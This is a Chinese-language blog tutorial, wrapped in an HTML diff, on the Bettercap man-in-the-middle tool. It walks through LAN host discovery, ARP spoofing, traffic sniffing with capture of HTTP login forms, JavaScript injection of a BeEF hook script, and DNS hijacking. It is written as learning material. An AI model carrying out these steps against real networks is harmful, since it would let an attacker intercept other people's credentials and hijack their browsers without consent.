@@ -1,0 +1,235 @@
+
+<!DOCTYPE html>
+<html>
+  <head>
+    
+<meta charset="utf-8" >
+
+<title>局域网嗅探利器--Bettercap | Mari0er&#39;s Blog</title>
+<meta name="description" content="">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.min.css">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://mari0er.top/favicon.ico?v=1768205765236">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://mari0er.top/styles/main.css">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+      <div class="site-header-container">
+  <div class="site-header">
+    <div class="left">
+      <a href="https://mari0er.top">
+        <img class="avatar" src="https://mari0er.top/images/avatar.png?v=1768205765236" alt="" width="32px" height="32px">
+      </a>
+      <a href="https://mari0er.top">
+        <h1 class="site-title">Mari0er&#39;s Blog</h1>
+      </a>
+    </div>
+    <div class="right">
+      <transition name="fade">
+        <i class="icon" :class="{ 'icon-close-outline': menuVisible, 'icon-menu-outline': !menuVisible }" @click="menuVisible = !menuVisible"></i>
+      </transition>
+    </div>
+  </div>
+</div>
+
+<transition name="fade">
+  <div class="menu-container" style="display: none;" v-show="menuVisible">
+    <div class="menu-list">
+      
+        
+          <a href="/" class="menu purple-link">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="menu purple-link">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="menu purple-link">
+            标签
+          </a>
+        
+      
+        
+          <a href="https://mari0er.top/post/about.html" class="menu purple-link">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+</transition>
+
+
+      <div class="content-container">
+        <div class="post-detail">
+          
+            <div class="feature-container" style="background-image: url('https://tuchuang.looklook.workers.dev/0808/bettercap.png')">
+            </div>
+          
+          <h2 class="post-title">局域网嗅探利器--Bettercap</h2>
+          <div class="post-info post-detail-info">
+            <span><i class="icon-calendar-outline"></i> 2018-09-29</span>
+            
+              <span>
+                <i class="icon-pricetags-outline"></i>
+                
+                  <a href="https://mari0er.top/tag/zhong-jian-ren/">
+                    中间人
+                    
+                      ，
+                    
+                  </a>
+                
+                  <a href="https://mari0er.top/tag/bettercap/">
+                    bettercap
+                    
+                      ，
+                    
+                  </a>
+                
+                  <a href="https://mari0er.top/tag/mitm/">
+                    MITM
+                    
+                  </a>
+                
+              </span>
+            
+          </div>
+          <div class="post-content">
+            <p>  Bettercap是一款局域网内的中间人工具，目前该工具更新到了2.9版本<a href="https://github.com/bettercap/bettercap">(github地址)</a>，编写代码由ruby语言改成了go语言，更新后的界面和操作方式类似msf，相比ruby版本，go语言版操作更加方便功能也更加强大。</p>
+<!--more-->
+<h3 id="0x01-bettercap的安装和基本命令">0x01 Bettercap的安装和基本命令</h3>
+<p>  最新版Kali可以通过 <strong>apt-get install bettercap</strong> 命令一键安装(需要先安装go语言环境)，运行时使用默认网卡，最前面可以看到你的ip地址和网段，你也可以使用 <strong>bettercap -iface +网卡名</strong> 命令来指定网卡。输入help或者?查看帮助菜单<br>
+<img src="https://tuchuang.looklook.workers.dev/0808/0803.png" alt="" loading="lazy"></p>
+<blockquote>
+<p><strong>help MODULE</strong>: 帮助菜单<br>
+<strong>active</strong>: 显示有关活动模块的信息<br>
+<strong>quit</strong>: 关闭模块并退出bettercap<br>
+<strong>sleep SECONDS</strong>: 设定睡眠时间<br>
+<strong>get NAME</strong>: 查询模块变量的值<br>
+<strong>set NAME VALUE</strong>: 设置模块变量的值<br>
+<strong>! COMMAND</strong>: 执行shell命令并打印其输出</p>
+</blockquote>
+<h3 id="0x02-模块的介绍和使用">0x02 模块的介绍和使用</h3>
+<p>  使用方法和注意事项官方<a href="https://github.com/bettercap/bettercap/wiki">Wiki</a>上写的很详细，我就不做详解，可以从下文我的实际操作中学习基本的使用方法。Bettercap默认启动的模块有<strong>events.stream</strong>和<strong>net.recon</strong>，输入<strong>help net.recon</strong>可以查看该模块的使用方法和参数<br>
+<img src="https://tuchuang.looklook.workers.dev/0808/0805.png" alt="" loading="lazy"><br>
+<strong>events.stream</strong>模块是事件输出流，用于在屏幕上输出信息 <strong>net.recon</strong>是侦察模式，用来探寻局域网内的其他主机，这时你就理解了为什么刚打开工具时会有那么多输出信息，那是因为Bettercap在寻找局域网内的其他在线主机。<br>
+<img src="https://tuchuang.looklook.workers.dev/0808/0801.png" alt="" loading="lazy"></p>
+<h3 id="0x03-内网攻击之arp欺骗">0x03 内网攻击之Arp欺骗</h3>
+<p>  Arp欺骗是最简单的断网和中间人攻击手法之一，这里主要是通过讲解arp欺骗的过程，让大家学会Bettercap的使用方法。<br>
+首先第一步是寻找局域网内的主机，默认是自动寻找，可以利用<strong>net.show</strong>命令来查看当前已找到的主机列表，如果发现没有目的主机可以打开<strong>net.probe on</strong>模块，该模块通过向子网上的每个可能的IP发送虚拟UDP数据包来探测网络上的新主机。<br>
+<img src="https://tuchuang.looklook.workers.dev/0808/0806.png" alt="" loading="lazy"><br>
+接下来就是添加arp欺骗的目标，通过set命令设定目标机器的IP，打开arp欺骗即可。</p>
+<blockquote>
+<p><strong>arp.spoof</strong>：进行arp欺骗，并转发目标机器的流量<br>
+<strong>arp.ban</strong>: 进行arp欺骗，不转发目标机器的流量，相当于断网攻击</p>
+</blockquote>
+<p><img src="https://tuchuang.looklook.workers.dev/0808/0807.png" alt="" loading="lazy"><br>
+可以看到欺骗后，目标的arp缓存表发生了变化，攻击机成功伪装成了网关的MAC地址。左边为欺骗前，右边为欺骗后<br>
+<img src="https://tuchuang.looklook.workers.dev/0808/arp.png" alt="" loading="lazy"></p>
+<h3 id="0x04-内网攻击之网络嗅探">0x04 内网攻击之网络嗅探</h3>
+<p>  Sniff模块用于嗅探网络流量，默认情况下会嗅探局域网内所有主机的所有流量</p>
+<blockquote>
+<p><strong>net.sniff.local</strong>：如果为true，它会嗅探来自本机的数据包，否则会跳过它们<br>
+<strong>net.sniff.output</strong>：设置嗅探流量的保存位置和名字<br>
+<strong>net.sniff.regexp</strong>：设置正则，只会嗅探符合正则匹配里的数据包</p>
+</blockquote>
+<p><img src="https://tuchuang.looklook.workers.dev/0808/0808.png" alt="" loading="lazy"><br>
+  可以看到能嗅探到目标主机和本机的流量(攻击机为kali虚拟机)，在http协议下还可以直接抓取登陆的表单，https协议的话只能看到链接，抓不到表单(说实话感觉嗅探没什么大用途，只能看到一些浏览记录，算是隐私泄露吧~)<br>
+<img src="https://tuchuang.looklook.workers.dev/0808/0809.png" alt="" loading="lazy"></p>
+<h3 id="0x05-内网攻击之注入js">0x05 内网攻击之注入JS</h3>
+<p>  Arp欺骗后，目标主机流量会经过攻击机，之后利用http.proxy代理模块，就可以修改数据包流量</p>
+<blockquote>
+<p><strong>http.proxy.address</strong>：代理IP地址，默认为物理网卡IP<br>
+<strong>http.proxy.injectjs</strong>：将URL、路径或JavaScript代码注入到每个HTML页面<br>
+<strong>http.proxy.script</strong>：加载JS脚本，官方JS脚本<a href="https://github.com/bettercap/caplets">地址</a><br>
+<strong>http.proxy.sslstrip</strong>：启用或禁用SSL剥离</p>
+</blockquote>
+<p><img src="https://tuchuang.looklook.workers.dev/0808/0810.png" alt="" loading="lazy"><br>
+下面利用Beef演示js注入功能，首先打开kali的beef框架，可以得到beef的钩子:<strong><script src="http://127.0.0.1:3000/hook.js"></script></strong>，登陆beef的网页管理界面(beef/beef)<br>
+<img src="https://tuchuang.looklook.workers.dev/0808/0811.png" alt="" loading="lazy"><br>
+接下来,首先利用bettercap进行arp欺骗，然后利用代理模块进行js注入<br>
+<img src="https://tuchuang.looklook.workers.dev/0808/0812.png" alt="" loading="lazy"><br>
+可以看到当被欺骗的主机访问人人网时，在其主页里面加入了我们的js代码，同样的道理利用https.proxy代理模块也可以注入js代码，但是此时需要一个可信的证书，不然浏览器会提示网站存在不可信的证书，无法访问。<br>
+<img src="https://tuchuang.looklook.workers.dev/0808/0813.png" alt="" loading="lazy"><br>
+此时在beef的管理页面上也可以看到刚上线的主机，beef上钩后可以进行很多操作，这里就不多说了(其实是自己不会23333)<br>
+<img src="https://tuchuang.looklook.workers.dev/0808/0814.png" alt="" loading="lazy"></p>
+<h3 id="0x06-内网攻击之dns劫持">0x06 内网攻击之DNS劫持</h3>
+<p>  DNS劫持可以修改目标主机访问域名的解析IP，例如你可以将百度的域名解析到你自己搭建的服务器上。劫持设备为电脑时你可能需要一个好的域名和证书才不容易被察觉(现在的谷歌浏览器和火狐浏览器都会提示http协议的网站不安全)，但是劫持手机的话，手机顶端只会显示网页的标题不会提示网页是否使用https证书，此时利用Set工具集配合dns劫持就可以完成一次完整的中间人攻击，挖坑待补。</p>
+<blockquote>
+<p>作者： Mari0er<br>
+链接： https://mari0er.top/post/bettercap.html<br>
+版权： 本博客所有文章除特别声明外，均采用<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！！</p>
+</blockquote>
+
+          </div>
+        </div>
+
+        
+          <div class="next-post">
+            <a class="purple-link" href="https://mari0er.top/post/command.html/">
+              <h3 class="post-title">
+                下一篇：常用命令积累
+              </h3>
+            </a>
+          </div>
+          
+      </div>
+
+      
+
+      <div class="site-footer">
+  <div class="slogan"></div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+  待人友善是修养 独来独往是性格 | <a class="rss" href="https://mari0er.top/atom.xml" target="_blank">RSS</a>
+</div>
+
+
+    </div>
+    <script type="application/javascript">
+
+hljs.initHighlightingOnLoad()
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+  </body>
+</html>
